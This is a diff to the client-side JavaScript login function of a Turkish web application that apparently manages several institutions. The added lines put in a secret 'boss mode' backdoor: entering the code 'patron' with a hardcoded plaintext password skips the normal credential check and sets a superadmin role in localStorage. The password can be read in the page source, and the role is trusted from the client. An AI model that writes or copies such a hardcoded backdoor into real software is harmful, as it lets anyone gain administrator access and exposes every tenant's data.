@@ -278,10 +278,23 @@
             document.getElementById('form' + t.charAt(0).toUpperCase() + t.slice(1)).classList.add('active');
         }
 
-      // 🔥 GİRİŞ YAPINCA KAPILARI AÇAN SİHİRLİ FONKSİYON 🔥
+            // 🔥 GİRİŞ YAPINCA KAPILARI AÇAN SİHİRLİ FONKSİYON 🔥
         async function sihirliGirisYap() {
             const kod = document.getElementById("loginKurumKod").value.trim().toLowerCase();
             const sifre = document.getElementById("loginSifre").value;
+
+            // 👑 PATRON MODU (SÜPER YÖNETİCİ) GİZLİ GİRİŞİ 👑
+            if (kod === "patron" && sifre === "86488648") {
+                localStorage.setItem('sm_current_tenant', 'addh'); // Ana veritabanı (döngüye girmemesi için)
+                localStorage.setItem('sm_active_user', 'SİSTEM KURUCUSU');
+                localStorage.setItem('sm_current_kurum_adi', 'MASTER KONTROL PANELİ');
+                localStorage.setItem('sm_role', 'superadmin');
+                
+                document.getElementById("loginCard").style.display = "none";
+                document.getElementById("gateSelector").style.display = "block";
+                return; // Aşağıdaki normal giriş sorgulamalarını yapmadan direkt içeri al!
+            }
+
             if(!kod || !sifre) return alert("Boş alan bırakmayın!");
 
             // Ali'nin girdiği şifreyi veritabanındaki formatına (kriptoya) çeviriyoruz
